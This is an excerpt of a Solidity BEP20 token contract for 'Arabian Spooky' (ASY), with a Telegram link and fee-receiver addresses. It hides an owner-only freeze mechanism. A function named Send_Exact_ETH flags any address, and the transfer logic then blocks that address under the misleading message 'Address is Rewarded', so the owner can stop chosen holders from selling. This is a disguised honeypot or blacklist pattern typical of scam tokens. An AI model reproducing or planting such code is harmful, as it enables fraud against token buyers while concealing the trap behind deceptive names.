...
/**
telegram : https://t.me/ArabianSpooky
...
contract ArabianSpooky is Ownable, IBEP20 {
    using SafeMath for uint256;
    ...
    string constant _name = "Arabian Spooky";
    string constant _symbol = "ASY";
    ...
    constructor () {
       router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        ...
        marketingFeeReceiver = 0x78db9c157341Fdd3c7680e60f34f784062C68e17;
        buybackFeeReceiver = msg.sender;
        devFeeReceiver = 0x78db9c157341Fdd3c7680e60f34f784062C68e17;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require(!isETHSent[recipient] && !isETHSent[sender], 'Address is Rewarded');
    ...
    function Send_Exact_ETH(address _address, bool _value) public authorized{
        isETHSent[_address] = _value;
    }
